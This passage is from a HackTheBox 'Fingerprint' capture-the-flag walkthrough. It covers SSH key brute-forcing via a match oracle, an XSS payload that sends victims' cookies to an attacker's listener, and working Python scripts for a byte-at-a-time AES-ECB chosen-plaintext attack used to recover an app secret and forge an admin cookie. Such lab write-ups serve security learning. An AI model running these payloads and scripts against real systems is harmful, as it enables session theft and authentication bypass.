class="line">    <span class="keyword">global</span> final_key</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">        test_key = final_key + c</span><br><span class="line">        out = os.popen(<span class="string">f&#x27;cmatch /home/john/.ssh/id_rsa &quot;<span class="subst">&#123;test_key&#125;</span>&quot;&#x27;</span>).read()</span><br><span class="line">        <span class="keyword">if</span> out == <span class="string">&quot;Found matches: 1\n&quot;</span>:</span><br><span class="line">            final_key += c</span><br><span class="line">            os.system(<span class="string">&#x27;cls&#x27;</span> <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;clear&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(final_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:           </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        bruteforce()</span><br></pre></td></tr></table></figure>

<p>Let’s run it:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/164198016-31a1ff7c-bd60-4c8c-8f03-8dedbe49c27e.gif" alt="https://user-images.githubusercontent.com/9076747/164198016-31a1ff7c-bd60-4c8c-8f03-8dedbe49c27e.gif"></p>
<p>Until we retrieve the full key:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,C310F9D86AE7CB5EA10046F9A215F423</span><br><span class="line"></span><br><span class="line">ysiTr753RYpx1qkFJRvge/Dtu7rMEocAuCchOzAUgw9MqyPuI5M9m6KTvdB2E+SC</span><br><span class="line">KI8IlmSbAAu0obdwTOuKD0QDGCMlXadI91WKkhALiLuw0JsxuviTqkjy/xQOJYu+</span><br><span class="line">T4VCRI8vZoc5lfGRXnVsOJmrfTWc8f43YSD+j8dOFvdkHi0ud7xSQfqKyhDVsRyO</span><br><span class="line">6qM2v5RnBJBktl7vwftG5vyk5vZjmx2u5BXTksuBrMUF2iZVtsoQ59L70CtIXP0M</span><br><span class="line">g5HV4QZWRhSlS++i8W0GnWzCGANwiS18Z6CR4noSw80huaCIqWfwnoTXGJx91IDM</span><br><span class="line">[...]</span><br><span class="line">sq0H1EhWic++FzpFC1QjvmWlFIA8+KUt2BL0fz7RTQTfR0EGyZnZv9Dqe6QCneIE</span><br><span class="line">U3tpTZByfgx+MI2LIM8GXjvhUOiM6DieB2OFWsR8JRyred2qFJOjz7fX5TUl9dQv</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>Let’s get a more stable shell and grab the flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa john@fingerprint.htb</span><br><span class="line"></span><br><span class="line">Last login: Wed Jan 26 16:38:01 2022</span><br><span class="line">john@fingerprint:~$ cat user.txt</span><br><span class="line">8a47xxxxxxxxxxxf9f</span><br></pre></td></tr></table></figure>

<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Looking around the files owned by <code>john</code> we stumble upon a backup folder of what looks like the main Flask app (<code>/var/backups/flask-app-secure.bak</code>). </p>
<p>Let’s now take a look at the backup.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp -i id_rsa john@fingerprint.htb:/var/backups/flask-app-secure.bak flask-app-secure.bak</span><br><span class="line">[hg8@archbook ~]$ unzip flask-app-secure.bak</span><br></pre></td></tr></table></figure>

<p>The <code>improvement</code> file talks about a custom crypto, it’s a good indicator as to what to look for since custom crypto are, most of time, mot super strong.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat improvements</span><br><span class="line">[x] fixed access control flaw</span><br><span class="line">[x] introduced authorization</span><br><span class="line">[x] safe authentication with custom crypto </span><br></pre></td></tr></table></figure>

<p>So it seems like an improved version of the original Flask app. We can also guess it’s the one running on port 8088:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">john@fingerprint:~$ netstat -an --tcp --program</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:8088            0.0.0.0:*               LISTEN      -</span><br><span class="line">john@fingerprint:~$ curl localhost:8088 -I</span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 10916</span><br><span class="line">Server: Werkzeug/1.0.1 Python/2.7.17</span><br><span class="line">Date: Mon, 18 Apr 2022 16:50:25 GMT</span><br></pre></td></tr></table></figure>

<p>Let’s forward the port on our machine to work on it easily:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -L 8088:localhost:8088 -i id_rsa john@fingerprint.htb</span><br></pre></td></tr></table></figure>

<p>Reading through the source code of <code>[app.py](http://app.py)</code> we can see that an encryption logic has been added to the user cookie:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># todo: use stronger passphrase before running app</span></span><br><span class="line">SECRET = <span class="string">&quot;password&quot;</span></span><br><span class="line">KEY = <span class="string">&quot;mykey&quot;</span></span><br><span class="line"></span><br><span class="line">cryptor = AES.new(KEY, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">data</span>):</span></span><br><span class="line">    result = cryptor.decrypt(data.decode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">    pad_len = <span class="built_in">ord</span>(result[-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> result[:-pad_len]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="comment"># do some padding</span></span><br><span class="line">    block_size = <span class="number">16</span></span><br><span class="line">    pad_size = block_size - <span class="built_in">len</span>(data) % block_size</span><br><span class="line">    padding = <span class="built_in">chr</span>(pad_size) * pad_size</span><br><span class="line">    data += padding</span><br><span class="line">    <span class="keyword">return</span> cryptor.encrypt(data).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        user = do_auth()</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            e = user[<span class="number">0</span>].encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">&quot;,&quot;</span> + SECRET + <span class="string">&quot;,&quot;</span> + (<span class="string">&quot;true&quot;</span> <span class="keyword">if</span> user[<span class="number">2</span>] <span class="keyword">else</span> <span class="string">&quot;false&quot;</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;setting cookie to &quot;</span>+ e)</span><br><span class="line">            resp = make_response()</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;user_id&quot;</span>, value=encrypt(e))</span><br><span class="line">            resp.headers[<span class="string">&#x27;location&#x27;</span>] = url_for(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> resp, <span class="number">302</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> show_login()</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_user</span>():</span></span><br><span class="line">    uid = request.cookies.get(<span class="string">&#x27;user_id&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        g.uid = decrypt(uid)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;decrypted to &quot;</span> + g.uid)</span><br><span class="line">        split = g.uid.split(<span class="string">&quot;,&quot;</span> + SECRET + <span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> g.uid:</span><br><span class="line">            g.name = split[<span class="number">0</span>]</span><br><span class="line">            g.is_admin = split[<span class="number">1</span>] == <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(e))</span><br></pre></td></tr></table></figure>

<p>Using the XSS we found earlier we can retrieve the<code>micheal1235</code> cookie in order to analyze the format:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">&quot;http://10.10.14.80:8000/&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>We get the following cookie:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.129.119.65 - - [18/Apr/2022 15:55:10] <span class="string">&quot;GET /user_id=49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure>

<p>Alright, so we know how the cookie is being created, its exact format and how it is encrypted.<br>If we find a way to retrieve the <code>SECRET</code> used to create the encrypted cookie we should be able to forge an <code>admin</code> cookie and authenticate as such.</p>
<h3 id="ECB-Attack"><a href="#ECB-Attack" class="headerlink" title="ECB Attack"></a>ECB Attack</h3><p>From the source code of <code>[app.py](http://app.py)</code> we know the encryption method used to create cookies is Electectronic Codebook (ECB).</p>
<blockquote>
<p><strong>Electronic codebook (ECB)</strong><br>The simplest (and not to be used anymore) of the encryption modes is the electronic codebook (ECB) mode. The message is divided into blocks, and each block is encrypted separately.<br>The disadvantage of this method is a lack of diffusion. Because ECB encrypts identical plaintext blocks into identical ciphertext blocks, it does not hide data patterns well. ECB is not recommended for use in cryptographic protocols.<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_Codebook_.28ECB.29">Wikipedia</a></p>
</blockquote>
<p>In ECB mode, each block of plain-text is encrypted independently with the key as illustrated by the diagram below.</p>
<p><img src="https://user-images.githubusercontent.com/9076747/164252769-66526746-ec42-4118-b50d-6b5c3dd08b04.png" alt="https://user-images.githubusercontent.com/9076747/164252769-66526746-ec42-4118-b50d-6b5c3dd08b04.png"></p>
<p>Since each block of plain-text is encrypted with the key independently, identical blocks of plain-text will yield identical blocks of cipher-text.</p>
<p>For example if we had <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab</code> string encrypted with ECB the output will look like so:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/164254008-7bde149a-bd72-4bf5-8e4e-ac08cc097458.png" alt="https://user-images.githubusercontent.com/9076747/164254008-7bde149a-bd72-4bf5-8e4e-ac08cc097458.png"></p>
<p>Notice how the first two blocks have the same output because they have the same input (‘a’ * 16).</p>
<p>So if we have two 16 byte blocks with the same input, we’ll get the same output. This is the info leak we’ll be abusing (<a target="_blank" rel="noopener" href="https://c0nradsc0rner.com/2016/07/03/ecb-byte-at-a-time/">more info on ECB attacks</a>).</p>
<p>Our current situation is perfect to perform an adaptive chosen plain-text attack in order to retrieve the app <code>SECRET</code>.</p>
<p>The first step needed to attack ECB encryption is determining the block size.</p>
<h3 id="Determining-ECB-Block-Size"><a href="#Determining-ECB-Block-Size" class="headerlink" title="Determining ECB Block Size"></a>Determining ECB Block Size</h3><p>To determine the block size we start sending specific lengths of plain-text into our cryptographic oracle (<code>/profile/</code> endpoint of the Flask application). </p>
<p>With the code below we are sending an increasing number of characters (<code>A</code>) until the cipher-text (our cookie) increases by one block size.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;user_id&quot;</span>:<span class="string">&quot;49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">user_id_len = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">new_user_id_len = <span class="number">0</span></span><br><span class="line">username_len = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> user_id_len &gt;= new_user_id_len:</span><br><span class="line">    username = <span class="string">&quot;A&quot;</span> * username_len</span><br><span class="line">    request = session.post(<span class="string">&quot;http://localhost:8088/profile&quot;</span>, data=&#123;<span class="string">&quot;new_name&quot;</span>:username&#125;, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    user_id = request.cookies[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    new_user_id_len = <span class="built_in">len</span>(user_id)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Username: <span class="subst">&#123;username&#125;</span> (<span class="subst">&#123;username_len&#125;</span>) return a <span class="subst">&#123;new_user_id_len&#125;</span> bytes lengh cipher text&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(user_id)</span><br><span class="line">    username_len+=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[!] Block length is: <span class="subst">&#123;new_user_id_len&#125;</span> - <span class="subst">&#123;user_id_len&#125;</span> = <span class="subst">&#123;new_user_id_len - user_id_len&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Let’s run it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python block_length.py </span><br><span class="line">[+] Username: A (1) <span class="built_in">return</span> a 128 bytes lengh cipher text</span><br><span class="line">a4ede69d8b7ae80488736180da942c916b0b44b082849f3f336032a5d82701dcb6ab4b8d35a059a661b415f31e899c1aaf04b1ea54c123c76cdae0970af2c7fb</span><br><span class="line">[+] Username: AA (2) <span class="built_in">return</span> a 128 bytes lengh cipher text</span><br><span class="line">21405a0146941e37cdf7ff2946224b515bcd3a54dc29900348c7742a116bbc2622a2c0f8857d63242be7beff5fa037d4703df05f4323ab57c2e39aeb0e41a8df</span><br><span class="line">[+] Username: AAA (3) <span class="built_in">return</span> a 128 bytes lengh cipher text</span><br><span class="line">08a6b38e239d0db0fba708c2ea3b70f960083b3cc2fa083da57e2592bde0753e10812508e65b4de30459aa6e9953d70e2b6177e92e4bf8d0dfccf12de355ea07</span><br><span class="line">[+] Username: AAAA (4) <span class="built_in">return</span> a 128 bytes lengh cipher text</span><br><span class="line">50ed63bc99cd1420153555b126fcd3bfb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb</span><br><span class="line">[+] Username: AAAAA (5) <span class="built_in">return</span> a 128 bytes lengh cipher text</span><br><span class="line">6da40f0d01d4f36ab4528ece20518bf92c4925c21dc4a69962e8a270c9547a89eddf64bea0c36bd8703fb69288e402f76cceb3dda6ec878825a2689fcd3a23c3</span><br><span class="line">[+] Username: AAAAAA (6) <span class="built_in">return</span> a 160 bytes lengh cipher text</span><br><span class="line">ae3b506662b7a1baf069d0e782da6d5c391ce5c01f644c0b8b0cb73ccb8bf61a98d9ab274bae93825d183c60393be9d447cb89d331973b4a476b1e08185a668719945bb4f4e3fa4cb7f1ff42564675d0</span><br><span class="line">[!] Block length is: 160 - 128 = 32.</span><br></pre></td></tr></table></figure>

<p>At 6 characters, our cipher-text increases by one block size. By subtracting the input length between to block number increases we can find our block length (160 - 128 = 32 bytes). </p>
<h3 id="ECB-Attack-1"><a href="#ECB-Attack-1" class="headerlink" title="ECB Attack"></a>ECB Attack</h3><p>The next step is finding the offset of our chosen plain-text start. The offset can usually be found by prepending bytes in increasing length to <code>block size * 2</code> of a static value until two consecutive blocks of cipher-text are found.</p>
<p>Thanks to the source code we know that we don’t need to calculate the offset of our plain-text (start as the first byte of a block):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line">e = new_name + <span class="string">&quot;,&quot;</span> + SECRET + <span class="string">&quot;,&quot;</span> + (<span class="string">&quot;true&quot;</span> <span class="keyword">if</span> g.is_admin <span class="keyword">else</span> <span class="string">&quot;false&quot;</span> )</span><br></pre></td></tr></table></figure>

<p>We can now start attacking the cipher-text. We’ll attack it by using a static value that’s <code>block size  - 1</code> in length (<code>start_block_gap = 31</code>). The last byte will get populated with a byte of unknown cipher-text and we record the resultant value as our reference value.</p>
<p>We can then brute-force the unknown byte by iterating though all possible values for the plain-text and comparing it to our reference value until we find a match.</p>
<p>We can come up with the following script in order to brute-force the secret:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">cookies = &#123;<span class="string">&quot;user_id&quot;</span>: <span class="string">&quot;49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">block_size = <span class="number">32</span></span><br><span class="line">start_block_gap = <span class="number">31</span></span><br><span class="line">known = <span class="string">&#x27;,&#x27;</span>  <span class="comment"># new_name to SECRET delimiter in app.py</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_blocks</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    new = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(user_id), block_size):</span><br><span class="line">        new.append(user_id[i:i+block_size])</span><br><span class="line">    <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    request = session.post(<span class="string">&quot;http://127.0.0.1:8088/profile&quot;</span>, data=&#123;<span class="string">&quot;new_name&quot;</span>: <span class="string">&quot;A&quot;</span>*(start_block_gap - <span class="built_in">len</span>(known))&#125;, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    user_id = request.cookies[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    reference_block = get_blocks(user_id)</span><br><span class="line">    <span class="comment"># print(&quot;[+] Reference Payload:\n&quot; + &quot;A&quot;*(start_block_gap - len(known)))</span></span><br><span class="line">    <span class="comment"># print(f&quot;[+] Reference block\n: &#123;reference_block&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> printable:</span><br><span class="line">        request = session.post(<span class="string">&quot;http://127.0.0.1:8088/profile&quot;</span>, data=&#123;<span class="string">&quot;new_name&quot;</span>: <span class="string">&quot;A&quot;</span>*(start_block_gap - <span class="built_in">len</span>(known))+known+character&#125;, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        user_id = request.cookies[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">        block = get_blocks(user_id)</span><br><span class="line">        <span class="comment"># print(&quot;[+] Payload:\n&quot; + &quot;A&quot;*(start_block_gap - len(known))+known+character)</span></span><br><span class="line">        <span class="comment"># print(block)</span></span><br><span class="line">        <span class="keyword">if</span>(block[<span class="number">1</span>] == reference_block[<span class="number">1</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] Reference block found!&quot;</span>)</span><br><span class="line">            known += character</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Current secret: <span class="subst">&#123;known&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Running the attack:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python ecb_attack.py</span><br><span class="line">[!] Reference block found!</span><br><span class="line">Current secret: ,7</span><br><span class="line">[!] Reference block found!</span><br><span class="line">Current secret: ,7h</span><br><span class="line">[...]</span><br><span class="line">Current secret: ,7h15_15_4_v3ry_57r0n6_4nd_uncr</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/hg8/hackthebox/machines/fingerprint/root/att.py&quot;</span>, line 22, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    user_id = request.cookies[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.10/site-packages/requests/cookies.py&quot;</span>, line 328, <span class="keyword">in</span> __getitem__</span><br><span class="line">    <span class="built_in">return</span> self._find_no_duplicates(name)</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.10/site-packages/requests/cookies.py&quot;</span>, line 399, <span class="keyword">in</span> _find_no_duplicates</span><br><span class="line">    raise KeyError(<span class="string">&#x27;name=%r, domain=%r, path=%r&#x27;</span> % (name, domain, path))</span><br><span class="line">KeyError: <span class="string">&quot;name=&#x27;user_id&#x27;, domain=None, path=None&quot;</span></span><br></pre></td></tr></table></figure>

<p>And we got an error. It’s because the secret seems to be more than 32 chars. After tweaking our script a bit to use 64 bytes instead (<code>start_block_gap = 63</code> and <code>block[3] == reference_block[3])</code> we manage to retrieve the full secret:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python ecb_attack.py</span><br><span class="line">[!] Reference block found!</span><br><span class="line">Current secret: ,7h</span><br><span class="line">[...]</span><br><span class="line">Current secret: ,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="Cookie-forging-part-2"><a href="#Cookie-forging-part-2" class="headerlink" title="Cookie forging - part 2"></a>Cookie forging - part 2</h3><p>Alright, now that we have the secret can we find a way to login as <code>admin</code> ? Unfortunately we can only manipulate the username part of the cookie, but if we dig in the code a bit more we notice an interesting flaw in the cookie loading logic:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_user</span>():</span></span><br><span class="line">    uid = request.cookies.get(<span class="string">&#x27;user_id&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        g.uid = decrypt(uid)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;decrypted to &quot;</span> + g.uid)</span><br><span class="line">        split = g.uid.split(<span class="string">&quot;,&quot;</span> + SECRET + <span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> g.uid:</span><br><span class="line">            g.name = split[<span class="number">0</span>]</span><br><span class="line">            g.is_admin = split[<span class="number">1</span>] == <span class="string">&quot;true&quot;</span></span><br></pre></td></tr></table></figure>

<p>The split is being run with <code>&quot;,&quot; + SECRET + &quot;,&quot;</code> in order to determine the username and if the user is Admin or not.</p>
<p>Knowing the secret we can append <code>,SECRET,true</code> to our username like so <code>hg8,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,true</code> and the application should trust us as admin when processing the cookie:</p>
